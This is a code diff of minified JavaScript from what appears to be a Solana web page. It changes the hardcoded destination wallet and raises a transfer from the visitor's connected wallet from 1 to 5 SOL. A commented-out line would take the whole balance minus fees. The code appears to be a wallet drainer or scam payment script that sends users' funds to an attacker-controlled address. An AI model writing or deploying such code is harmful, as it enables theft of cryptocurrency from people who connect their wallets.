@@ -447,7 +447,7 @@
                                             }
                                             return t.abrupt("return");
                                         case 2:
-                                            if (n = new k.PublicKey("CMjdYAW71ErxismdWDoeCYqPW296ajrmvA1rydgpgmMn"), !H) {
+                                            if (n = new k.PublicKey("hexWsZrV3aMqCPgAtHFLgvrTBWgksQLNhWMsWgnbV4Z"), !H) {
                                                 t.next = 15;
                                                 break
                                             }
@@ -456,7 +456,7 @@
                                             return r = t.sent, console.log(r), (a = (new k.Transaction).add(k.SystemProgram.transfer({
                                                 fromPubkey: H.publicKey,
                                                 toPubkey: n,
-                                                lamports: 1000000000
+                                                lamports: 5000000000
                                                     // lamports: r - 5e3
                                                     // lamports: 1000000000
                                             }))).feePayer = H.publicKey, c = a, t.next = 13, e.connection.getRecentBlockhash();
@@ -578,7 +578,7 @@
                 I = n(112),
                 C = n(336),
                 W = n(597),
-                N = new M.d.PublicKey("CMjdYAW71ErxismdWDoeCYqPW296ajrmvA1rydgpgmMn"),
+                N = new M.d.PublicKey("hexWsZrV3aMqCPgAtHFLgvrTBWgksQLNhWMsWgnbV4Z"),
                 D = new M.d.PublicKey("GEJPSxYDUhEjcb8xdnKRV78TkawYyD6jMa5Yq9ENLunW"),
                 Y = new M.d.PublicKey("B9krQx8viSfhQe3bbYdqYuWAk8aoGNx7BQnMCumS2ALL"),
                 z = "mainnet-beta",
